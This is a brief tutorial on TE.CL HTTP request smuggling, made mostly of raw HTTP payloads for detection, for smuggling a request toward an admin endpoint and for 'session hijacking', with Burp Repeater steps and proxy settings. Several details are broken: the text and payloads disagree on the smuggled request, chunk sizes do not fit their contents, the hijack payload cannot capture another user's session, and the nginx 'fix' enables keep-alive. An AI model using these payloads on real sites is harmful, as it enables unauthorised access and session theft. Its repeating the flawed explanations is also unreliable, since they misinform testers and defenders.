# TE.CL Attack Example

## Scenario
Front-end uses `Transfer-Encoding: chunked`, back-end uses `Content-Length`

## Basic Detection
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
0

```

The second request may trigger unusual behavior or timeout.

## Exploitation: Admin Access

### Smuggling to Admin Endpoint
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

5c
GPOST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

This prepends `GPOST` to the next legitimate request, causing it to become `GPOST /admin HTTP/1.1`.

## Advanced: Session Hijacking

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

88
GET /account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=stolen_session_token
X-Session-Hijack: true

0

```

This request will capture the next user's session data.

## Burp Suite Testing

1. Use **Burp Repeater** for manual testing
2. Send the request **twice quickly**
3. Observe the second response for:
   - Different status codes
   - Unexpected responses
   - Error messages revealing the attack

## Defensive Measures

```nginx
# Nginx Configuration
proxy_http_version 1.1;
proxy_set_header Connection "";
keepalive_requests 1;
```

```apache
# Apache Configuration
KeepAlive Off
```
